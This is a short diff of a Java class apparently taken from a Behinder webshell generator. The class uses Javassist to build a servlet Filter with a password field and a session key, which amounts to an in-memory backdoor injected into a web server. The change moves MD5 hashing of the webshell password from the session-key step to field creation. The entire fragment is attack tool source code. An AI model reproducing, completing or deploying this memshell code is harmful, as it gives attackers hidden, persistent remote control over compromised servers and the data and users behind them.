@@ -26,7 +26,7 @@ public class Behinder4 {
             ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
         }
         ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
-        ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
+        ctClass.addField(CtField.make("public String passwd = \"" + md5(pass) + "\";", ctClass));
         ctClass.addField(CtField.make("public String tpath = \"" + path + "\";", ctClass));
         ctClass.addField(CtField.make("public String cs = \"UTF-8\";", ctClass));
         ctClass.addField(CtField.make("public javax.servlet.http.HttpServletRequest request = null;", ctClass));
@@ -93,7 +93,7 @@ public class Behinder4 {
                         "        obj.put(\"session\", session);\n"+
                 "             //  java.lang.System.out.println(111);\n" +
                 "           // response.setHeader(\"inject\", \"success\");\n" +
-                "            String k = md5(passwd);\n" +
+                "            String k = passwd;\n" +
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
                 "            try{\n" +
